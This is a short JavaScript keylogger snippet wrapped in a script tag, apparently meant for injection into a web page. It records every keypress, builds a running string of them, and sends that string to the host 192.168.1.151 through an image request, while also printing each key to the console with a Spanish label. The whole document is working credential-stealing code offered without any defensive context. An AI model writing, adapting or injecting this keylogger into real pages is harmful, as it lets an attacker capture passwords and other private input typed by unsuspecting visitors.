// JavaScript

<script>
	var k = "";
	document.onkeypress = function(e){
 	k += e.key;
	var i = new Image();
	i.src = "http://192.168.1.151" + k;
	console.log("Tecla Presionada: " + e.key);
	};

</script>
